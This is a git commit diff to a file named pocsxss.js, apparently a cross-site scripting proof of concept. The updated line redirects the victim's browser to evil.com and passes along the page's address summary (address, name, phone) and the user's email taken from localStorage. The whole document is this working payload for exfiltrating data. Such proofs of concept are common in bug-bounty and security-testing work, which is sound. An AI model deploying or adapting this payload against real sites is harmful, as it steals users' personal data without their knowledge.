7664e24a2b78c8d09b4447fb5864aeed4c4728a2
haxuanhuy <52565807+haxuanhuy@users.noreply.github.com>
2026-02-02 11:34:05 +0700

    Update pocsxss.js

--- pocsxss.js
+++ pocsxss.js
@@ -1,3 +1,3 @@
 await new Promise(r => setTimeout(r, 1000));
-location.replace("//evil.com?victim-pii=" + document.querySelector('.address-summary').innerText);
+location.replace("//evil.com?victim-address-name-phone=" + document.querySelector('.address-summary').innerText+"&email="+JSON.parse(localStorage.ajs_user_traits).email);
 
